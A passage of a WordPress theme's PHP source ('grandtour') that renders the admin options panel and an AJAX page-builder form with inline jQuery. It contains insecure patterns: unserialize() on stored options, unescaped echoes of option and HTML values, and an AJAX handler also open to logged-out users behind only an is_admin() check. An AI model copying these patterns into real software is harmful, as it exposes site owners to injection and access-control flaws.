			value="<?php if ( get_option( $value['id'] ) != "") { echo stripslashes(get_option( $value['id'])  ); } else { echo esc_attr($value['std']); } ?>"
			<?php if(!empty($value['size'])) { echo 'style="width:'.$value['size'].'"'; } ?> />
		</div>
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		
		<script>jQuery("#<?php echo esc_js($value['id']); ?>").slider({ from: <?php echo esc_js($value['from']); ?>, to: <?php echo esc_js($value['to']); ?>, step: <?php echo esc_js($value['step']); ?>, smooth: true, skin: "round_plastic" });</script>
	
		</div>
		<?php
	break;
	
	case 'colorpicker':
	?>
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_text"><label for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
		<input name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" type="text" 
			value="<?php if ( get_option( $value['id'] ) != "" ) { echo stripslashes(get_option( $value['id'])  ); } else { echo esc_attr($value['std']); } ?>"
			<?php if(!empty($value['size'])) { echo 'style="width:'.$value['size'].'"'; } ?>  class="color_picker" readonly/>
		<div id="<?php echo esc_attr($value['id']); ?>_bg" class="colorpicker_bg" onclick="jQuery('#<?php echo esc_js($value['id']); ?>').click()" style="background:<?php if (get_option( $value['id'] ) != "") { echo stripslashes(get_option( $value['id'])  ); } else { echo esc_attr($value['std']); } ?> url(<?php echo get_template_directory_uri(); ?>/functions/images/trigger.png) center no-repeat;">&nbsp;</div>
			<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		
		</div>
		
	<?php
	break;
	 
	case 'textarea':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_textarea"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label>
			
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		
		<textarea id="<?php echo esc_attr($value['id']); ?>" name="<?php echo esc_attr($value['id']); ?>"
			type="<?php echo esc_attr($value['type']); ?>" cols="" rows=""><?php if ( get_option( $value['id'] ) != "") { echo stripslashes(get_option( $value['id']) ); } else { echo esc_html($value['std']); } ?></textarea>
		
		<div class="clearfix"></div>
	
		</div>
	
		<?php
	break;
	
	case 'css':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_textarea"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label>
			
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		
		<textarea id="<?php echo esc_attr($value['id']); ?>" class="css" name="<?php echo esc_attr($value['id']); ?>"
			type="<?php echo esc_attr($value['type']); ?>"><?php if ( get_option( $value['id'] ) != "") { echo stripslashes(get_option( $value['id']) ); } else { echo esc_html($value['std']); } ?></textarea>
		
		<div class="clearfix"></div>
	
		</div>
	
		<?php
	break;
	 
	case 'select':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_select"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
	
		<select name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>">
			<?php foreach ($value['options'] as $key => $option) { ?>
			<option
			<?php if (get_option( $value['id'] ) == $key) { echo 'selected="selected"'; } ?>
				value="<?php echo esc_attr($key); ?>"><?php echo esc_html($option); ?></option>
			<?php } ?>
		</select> <small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		</div>
		<?php
	break;
	
	case 'font':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_font"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
	
		<div id="<?php echo esc_attr($value['id']); ?>_wrapper" style="float:left;font-size:11px;">
		<select class="pp_font" data-sample="<?php echo esc_attr($value['id']); ?>_sample" data-value="<?php echo esc_attr($value['id']); ?>_value" name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>">
			<option value="" data-family="">---- <?php esc_html_e('Theme Default Font', 'grandtour' ); ?> ----</option>
			<?php 
				foreach ($pp_font_arr as $key => $option) { ?>
			<option
			<?php if (get_option( $value['id'] ) == $option['css-name']) { echo 'selected="selected"'; } ?>
				value="<?php echo esc_attr($option['css-name']); ?>" data-family="<?php echo esc_attr($option['font-name']); ?>"><?php echo esc_html($option['font-name']); ?></option>
			<?php } ?>
		</select> 
		<input type="hidden" id="<?php echo esc_attr($value['id']); ?>_value" name="<?php echo esc_attr($value['id']); ?>_value" value="<?php echo get_option( $value['id'].'_value' ); ?>"/>
		<br/><br/><div id="<?php echo esc_attr($value['id']); ?>_sample" class="pp_sample_text"><?php esc_html_e('Sample Text', 'grandtour' ); ?></div>
		</div>
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		</div>
		<?php
	break;
	 
	case 'radio':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_select"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/><br/>
	
		<div style="margin-top:5px;float:left;<?php if(!empty($value['desc'])) { ?>width:300px<?php } else { ?>width:500px<?php } ?>">
		<?php foreach ($value['options'] as $key => $option) { ?>
		<div style="float:left;<?php if(!empty($value['desc'])) { ?>margin:0 20px 20px 0<?php } ?>">
			<input style="float:left;" id="<?php echo esc_attr($value['id']); ?>" name="<?php echo esc_attr($value['id']); ?>" type="radio"
			<?php if (get_option( $value['id'] ) == $key) { echo 'checked="checked"'; } ?>
				value="<?php echo esc_attr($key); ?>"/><?php echo esc_html($option); ?>
		</div>
		<?php } ?>
		</div>
		
		<?php if(!empty($value['desc'])) { ?>
			<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<?php } ?>
		<div class="clearfix"></div>
		</div>
		<?php
	break;
	
	case 'sortable':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_select"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
	
		<div style="float:left;width:100%;">
		<?php 
		$sortable_array = array();
		if(get_option( $value['id'] ) != 1)
		{
			$sortable_array = unserialize(get_option( $value['id'] ));
		}
		
		$current = 1;
		
		if(!empty($value['options']))
		{
		?>
		<select name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" class="pp_sortable_select">
		<?php
		foreach ($value['options'] as $key => $option) { 
			if($key > 0)
			{
		?>
		<option value="<?php echo esc_attr($key); ?>" data-rel="<?php echo esc_attr($value['id']); ?>_sort" title="<?php echo html_entity_decode($option); ?>"><?php echo html_entity_decode($option); ?></option>
		<?php }
		
				if($current>1 && ($current-1)%3 == 0)
				{
		?>
		
				<br style="clear:both"/>
		
		<?php		
				}
				
				$current++;
			}
		?>
		</select>
		<a class="button pp_sortable_button" data-rel="<?php echo esc_attr($value['id']); ?>" class="button" style="display:inline-block"><?php echo esc_html__('Add', 'grandtour' ); ?></a>
		<?php
		}
		?>
		 
		 <br style="clear:both"/><br/>
		 
		 <div class="pp_sortable_wrapper">
		 <ul id="<?php echo esc_attr($value['id']); ?>_sort" class="pp_sortable" rel="<?php echo esc_attr($value['id']); ?>_sort_data"> 
		 <?php
		 	$sortable_data_array = unserialize(get_option( $value['id'].'_sort_data' ));
	
		 	if(!empty($sortable_data_array))
		 	{
		 		foreach($sortable_data_array as $key => $sortable_data_item)
		 		{
			 		if(!empty($sortable_data_item))
			 		{
		 		
		 ?>
		 		<li id="<?php echo esc_attr($sortable_data_item); ?>_sort" class="ui-state-default"><div class="title"><?php echo esc_html($value['options'][$sortable_data_item]); ?></div><a data-rel="<?php echo esc_attr($value['id']); ?>_sort" href="javascript:;" class="remove"><i class="fa fa-trash"></i></a><br style="clear:both"/></li> 	
		 <?php
		 			}
		 		}
		 	}
		 ?>
		 </ul>
		 
		 </div>
		 
		</div>
		
		<input type="hidden" id="<?php echo esc_attr($value['id']); ?>_sort_data" name="<?php echo esc_attr($value['id']); ?>_sort_data" value="" style="width:100%"/>
		<br style="clear:both"/><br/>
		
		<div class="clearfix"></div>
		</div>
		<?php
	break;
	 
	case "checkbox":
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_checkbox"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
	
		<?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
		<input type="checkbox" name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" value="true" <?php echo esc_html($checked); ?> />
	
	
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		</div>
	<?php break; 
	
	case "iphone_checkboxes":
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_checkbox"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label>
	
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
	
		<?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
		<input type="checkbox" class="iphone_checkboxes" name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" value="true" <?php echo esc_html($checked); ?> />
	
		<div class="clearfix"></div>
		</div>
	
	<?php break; 
	
	case "html":
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_checkbox"><label
			for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
	
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
	
		<?php echo stripslashes($value['html']); ?>
	
		<div class="clearfix"></div>
		</div>
	
	<?php break; 
	
	case "shortcut":
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_shortcut">
	
		<ul class="pp_shortcut_wrapper">
		<?php 
			$count_shortcut = 1;
			foreach ($value['options'] as $key_shortcut => $option) { ?>
			<li><a href="#<?php echo esc_attr($key_shortcut); ?>" <?php if($count_shortcut==1) { ?>class="active"<?php } ?>><?php echo esc_html($option); ?></a></li>
		<?php $count_shortcut++; } ?>
		</ul>
	
		<div class="clearfix"></div>
		</div>
	
	<?php break; 
		
	case "section":
	
	$i++;
	
	?>
	
		<div id="pp_panel_<?php echo strtolower($value['name']); ?>" class="rm_section">
		<div class="rm_title">
		<h3><img
			src="<?php echo get_template_directory_uri(); ?>/functions/images/trans.png"
			class="inactive" alt=""><?php echo stripslashes($value['name']); ?></h3>
		<span class="submit"><input class="button-primary" name="save<?php echo esc_attr($i); ?>" type="submit"
			value="Save changes" /> </span>
		<div class="clearfix"></div>
		</div>
		<div class="rm_options"><?php break;
	 
	}
	}
	?>
	 	
	 	<div class="clearfix"></div>
	 	</form>
	 	</div>
	</div>
<?php
}

add_action('admin_menu', 'grandtour_add_admin');

/**
*	End Theme Setting Panel
**/ 


//Setup theme custom filters
require_once get_template_directory() . "/lib/theme.filter.lib.php";

//Setup Theme Customizer
require_once get_template_directory() . "/modules/kirki/kirki.php";
require_once get_template_directory() . "/lib/customizer.lib.php";

//Setup page custom fields and action handler
require_once get_template_directory() . "/fields/page.fields.php";

//Setup content builder
require_once get_template_directory() . "/modules/content_builder.php";

// Setup shortcode generator
require_once get_template_directory() . "/modules/shortcode_generator.php";


//Check if Woocommerce is installed	
if(class_exists('Woocommerce'))
{
	//Setup Woocommerce Config
	require_once get_template_directory() . "/modules/woocommerce.php";
}

/**
*	Setup AJAX portfolio content builder function
**/
add_action('wp_ajax_grandtour_ppb', 'grandtour_ppb');
add_action('wp_ajax_nopriv_grandtour_ppb', 'grandtour_ppb');

function grandtour_ppb() {
	if(is_admin() && isset($_GET['shortcode']) && !empty($_GET['shortcode']))
	{
		require_once get_template_directory() . "/lib/contentbuilder.shortcode.lib.php";
		
		if(isset($ppb_shortcodes[$_GET['shortcode']]) && !empty($ppb_shortcodes[$_GET['shortcode']]))
		{
			$selected_shortcode = $_GET['shortcode'];
			$selected_shortcode_arr = $ppb_shortcodes[$_GET['shortcode']];
			
			//get action value
			$ppb_builder_remove_id = '';
			if(isset($_GET['builder_action']) && isset($_GET['builder_action']) == 'add')
			{
				$ppb_builder_remove_id = $_GET['rel'];
			}
?>
			<!-- Display button for this content -->
			<div class="ppb_inline_title_bar">
				<h2><?php echo esc_html($selected_shortcode_arr['title']); ?></h2>
			</div>
			
			<div class="ppb_inline_wrap">
			    <a id="save_<?php echo esc_attr($_GET['rel']); ?>" data-parent="ppb_inline_<?php echo esc_attr($selected_shortcode); ?>" class="button ppb_inline_save" href="javascript:;"><?php esc_html_e('Update', 'grandtour' ); ?></a>
			    
			    <a class="button" href="javascript:;" onClick="cancelContent('<?php echo esc_attr($ppb_builder_remove_id); ?>');"><?php esc_html_e('Cancel', 'grandtour' ); ?></a>
			    
			</div>
			
			<div id="ppb_inline_<?php echo esc_attr($selected_shortcode); ?>" data-shortcode="<?php echo esc_attr($selected_shortcode); ?>" class="ppb_inline">
			<div class="ppb_inline_option_wrap">
				<?php
					if(isset($selected_shortcode_arr['title']) && $selected_shortcode_arr['title']!='Divider')
					{
				?>
				<div class="ppb_inline_option">
					
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_title"><?php esc_html_e('Title', 'grandtour' ); ?></label><br/>
						<span class="label_desc"><?php esc_html_e('Enter Title for this content', 'grandtour' ); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<input type="text" id="<?php echo esc_attr($selected_shortcode); ?>_title" name="<?php echo esc_attr($selected_shortcode); ?>_title" data-attr="title" value="Title" class="ppb_input"/>
					</div>
				</div>
				<br/>
				<?php
					}
					else
					{
				?>
				<input type="hidden" id="<?php echo esc_attr($selected_shortcode); ?>_title" name="<?php echo esc_attr($selected_shortcode); ?>_title" data-attr="title" value="<?php echo esc_attr($selected_shortcode_arr['title']); ?>" class="ppb_input"/>
				<?php
					}
				?>
				
				<?php
					$num_attr = count($selected_shortcode_arr['attr']);
					$i_count = 0;
				
					foreach($selected_shortcode_arr['attr'] as $attr_name => $attr_item)
					{
						$last_class = '';
						if(++$i_count === $num_attr)
						{
							$last_class = 'last';
						}
					
						if(!isset($attr_item['title']))
						{
							$attr_title = ucfirst($attr_name);
						}
						else
						{
							$attr_title = $attr_item['title'];
						}
					
						if($attr_item['type']=='jslider')
						{
				?>
				<div class="ppb_inline_option">
				
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" type="range" class="ppb_input" min="<?php echo esc_attr($attr_item['min']); ?>" max="<?php echo esc_attr($attr_item['max']); ?>" step="<?php echo esc_attr($attr_item['step']); ?>" value="<?php echo esc_attr($attr_item['std']); ?>" /><output for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" onforminput="value = foo.valueAsNumber;"></output><br/>
					</div>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="jslider"/>
				</div>
				<br/>
				<?php
						}
				
						if($attr_item['type']=='file')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" type="text"  class="ppb_input ppb_file" />
						<a id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_button" name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_button" type="button" class="metabox_upload_btn button" rel="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>">Upload</a>
						<img id="image_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" class="ppb_file_image" />
					</div>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="file"/>
				</div>
				<br/>
				<?php
						}
						
						if($attr_item['type']=='select')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<select name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" class="ppb_input">
						<?php
								foreach($attr_item['options'] as $attr_key => $attr_item_option)
								{
						?>
								<option value="<?php echo esc_attr($attr_key); ?>"><?php echo ucfirst($attr_item_option); ?></option>
						<?php
								}
						?>
						</select>
					</div>	
					<br style="clear:both"/>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="select"/>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="select"/>
				</div>
				<br/>
				<?php
						}
						
						if($attr_item['type']=='select_multiple')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<select name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" class="ppb_input" multiple="multiple">
						<?php
								foreach($attr_item['options'] as $attr_key => $attr_item_option)
								{
									if(!empty($attr_item_option))
									{
						?>
									<option value="<?php echo esc_attr($attr_key); ?>"><?php echo ucfirst($attr_item_option); ?></option>
						<?php
									}
								}
						?>
						</select>
					</div>
					<br style="clear:both"/>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="select_multiple"/>
				</div>
				<br/>
				<?php
						}
						
						if($attr_item['type']=='margin')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<strong><?php esc_html_e('top', 'grandtour' ); ?></strong>&nbsp;
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_top" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_top" type="text" class="ppb_input type_margin" />&nbsp;px&nbsp;
						&nbsp;
						<strong><?php esc_html_e('bottom', 'grandtour' ); ?></strong>&nbsp;
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_bottom" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_bottom" type="text" class="ppb_input type_margin" />&nbsp;px&nbsp;
						<br/>
						<strong><?php esc_html_e('left', 'grandtour' ); ?></strong>&nbsp;
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_left" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_left" type="text" class="ppb_input type_margin" />&nbsp;px&nbsp;
						&nbsp;
						<strong><?php esc_html_e('right', 'grandtour' ); ?></strong>&nbsp;
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_right" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_right" type="text" class="ppb_input type_margin" />&nbsp;px&nbsp;
					
						<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="margin"/>
					</div>
				</div>
				<br/>
				<?php
						}
						
						if($attr_item['type']=='text')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" type="text" class="ppb_input" />
					
						<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="text"/>
					</div>
				</div>
				<br/>
				<?php
						}
								
						if($attr_item['type']=='colorpicker')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<input name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" type="text" class="ppb_input color_picker" />
						<div id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>_bg" class="colorpicker_bg" onclick="jQuery('#<?php echo esc_js($selected_shortcode); ?>_<?php echo esc_js($attr_name); ?>').click()" style="background-color:<?php echo esc_attr($attr_item['std']); ?>;background-image: url(<?php echo get_template_directory_uri(); ?>/functions/images/trigger.png);margin-top:3px">&nbsp;</div><br style="clear:both"/>
					</div>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="colorpicker"/>
				</div>
				<br/>
				<?php
						}
						
						if($attr_item['type']=='textarea')
						{
				?>
				<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
					<div class="ppb_inline_label">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>"><?php echo esc_html($attr_title); ?></label><br/>
						<span class="label_desc"><?php echo esc_html($attr_item['desc']); ?></span>
					</div>
					
					<div class="ppb_inline_field">
						<textarea name="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" id="<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" cols="" rows="3" class="ppb_input type_textarea"></textarea>
					</div>
					
					<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="textarea"/>
				</div>
				<br/>
				<?php
						}
					}
				?>
				
				<?php
					if($attr_item['type']=='visual_editor')
					{
				?>
					<div class="ppb_inline_option <?php echo esc_attr($last_class); ?>">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_content"><?php esc_html_e('Content', 'grandtour' ); ?></label><br/>
						<span class="label_desc"><?php esc_html_e('You can enter text, HTML for its content', 'grandtour' ); ?></span><br/><br/>
						
						<textarea id="<?php echo esc_attr($selected_shortcode); ?>_content" name="<?php echo esc_attr($selected_shortcode); ?>_content" cols="" rows="5" class="ppb_input <?php if($_GET['builder_action'] == 'add') { ?>ppb_textarea<?php } ?>"></textarea>
						
						<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="content"/>
					</div>
				<?php
					}
				?>
				
				<?php
					if(isset($selected_shortcode_arr['content']) && $selected_shortcode_arr['content'])
					{
				?>
					<div class="ppb_inline_option <?php echo esc_attr($last_class); ?> content_option">
						<label for="<?php echo esc_attr($selected_shortcode); ?>_content"><?php esc_html_e('Content', 'grandtour' ); ?></label><br/>
						<span class="label_desc"><?php esc_html_e('You can enter text, HTML for its content', 'grandtour' ); ?></span><br/><br/>
						
						<textarea id="<?php echo esc_attr($selected_shortcode); ?>_content" name="<?php echo esc_attr($selected_shortcode); ?>_content" cols="" rows="5" class="ppb_input <?php if($_GET['builder_action'] == 'add') { ?>ppb_textarea<?php } ?>"></textarea>
						
						<input type="hidden" id="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" name="type_<?php echo esc_attr($selected_shortcode); ?>_<?php echo esc_attr($attr_name); ?>" value="content"/>
					</div>
				<?php
					}
				?>
			</div>
		</div>
		
		<script>
		jQuery(document).ready(function(){
			var formfield = '';
			
			ppbSetUnsaveStatus();
			
			if(jQuery('body').hasClass('ppb_duplicated'))
			{
				jQuery('.fancybox-inner .ppb_inline_wrap').addClass('duplicated');
			}
	
			jQuery('.metabox_upload_btn').click(function() {
			    jQuery('.fancybox-overlay').css('visibility', 'hidden');
			    jQuery('.fancybox-wrap').css('visibility', 'hidden');
		     	formfield = jQuery(this).attr('rel');
			    
			    var send_attachment_bkp = wp.media.editor.send.attachment;
			    wp.media.editor.send.attachment = function(props, attachment) {
			     	jQuery('#'+formfield).attr('value', attachment.url);
			     	jQuery('#image_'+formfield).attr('src', attachment.url);
			
			        wp.media.editor.send.attachment = send_attachment_bkp;
			        jQuery('.fancybox-overlay').css('visibility', 'visible');
			     	jQuery('.fancybox-wrap').css('visibility', 'visible');
			    }
			
			    wp.media.editor.open();
		     	return false;
		    });
		
			jQuery("#ppb_inline :input").each(function(){
				if(typeof jQuery(this).attr('id') != 'undefined')
				{
					 jQuery(this).attr('value', '');
				}
			});
			
			var currentItemData = jQuery('#<?php echo esc_js($_GET['rel']); ?>').data('ppb_setting');
			var currentItemOBJ = jQuery.parseJSON(currentItemData);
			
			jQuery.each(currentItemOBJ, function(index, value) { 
			  	if(typeof jQuery('#'+index) != 'undefined' && jQuery('#'+index).length > 0)
				{
					jQuery('#'+index).val(decodeURI(value));
					
					if(jQuery('#'+index).is('textarea') && jQuery('#'+index).hasClass('ppb_input') && !jQuery('#'+index).hasClass('type_textarea'))
					{
					    jQuery('#'+index).html(decodeURI(value));
					    jQuery('#'+index).wp_editor();
					}
					
					if(jQuery('#'+index).is('textarea') && jQuery('#'+index).hasClass('ppb_input') && jQuery('#'+index).hasClass('type_textarea'))
					{
					    jQuery('#'+index).html(decodeURI(value));
					}
					
					//Check if color picker
					if(jQuery('#'+index).hasClass('color_picker'))
					{
						var inputID = jQuery('#'+index).attr('id');
						jQuery('#'+inputID+'_bg').css('backgroundColor', jQuery('#'+index).val());
					}
					
					//Check if input file
					if(jQuery('#type_'+index).val()=='file')
					{
						jQuery('#image_'+index).attr('src', value);
					}
					
					//Check if input video
					if(jQuery('#type_'+index).val()=='video')
					{
						jQuery('#video_view_'+index).attr('href', value);
					}
					
					//Check if multiple select
					if(jQuery('#type_'+index).val()=='select_multiple')
					{
						var data = value + '';
						var data_array = data.split(",");
						jQuery('#'+index).val(data_array);
					}
				}
			});
			
			jQuery('.color_picker').each(function()
			{	
			    var inputID = jQuery(this).attr('id');
			    
			    jQuery(this).ColorPicker({
			    	color: jQuery(this).val(),
			    	onShow: function (colpkr) {
			    		jQuery(colpkr).fadeIn(200);
			    		return false;
			    	},
			    	onHide: function (colpkr) {
			    		jQuery(colpkr).fadeOut(200);
			    		return false;
			    	},
			    	onChange: function (hsb, hex, rgb, el) {
			    		jQuery('#'+inputID).val('#' + hex);
			    		jQuery('#'+inputID+'_bg').css('backgroundColor', '#' + hex);
			    	}
			    });	
			    
			    jQuery(this).css('width', '200px');
			    jQuery(this).css('float', 'left');
			});
			
			var el, newPoint, newPlace, offset;
 
			 jQuery("input[type='range']").change(function() {
			 
			   el = jQuery(this);
			   
			   width = el.width();
